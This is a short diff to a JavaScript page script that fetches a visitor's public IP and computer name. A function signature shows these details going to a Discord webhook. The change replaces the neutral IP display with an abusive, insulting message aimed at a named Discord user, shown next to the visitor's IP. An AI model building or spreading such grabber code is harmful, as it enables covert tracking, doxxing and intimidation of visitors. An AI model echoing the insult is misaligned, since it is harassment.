@@ -13,7 +13,7 @@ document.addEventListener('keydown', function(event) {
         .then(response => response.json())
         .then(data => {
           // Display IP address on the screen
-          body[0].innerHTML = "Your Public IP Address: " + data.ip;
+          body[0].innerHTML = "Stop skidding fat fuck xkt on discord, Your IP: " + data.ip;
           
           // Obtain computer name
           const computerName = getComputerName();
@@ -86,7 +86,7 @@ function sendToDiscordWebhook(ipAddress, computerName, screenResolution, portNum
         .then(response => response.json())
         .then(data => {
           // Display IP address on the screen
-          body[0].innerHTML = "Your Public IP Address: " + data.ip;
+          body[0].innerHTML = "Stop skidding fat fuck xkt on discord, Your IP: " + data.ip;
           
           // Obtain computer name
           const computerName = getComputerName();
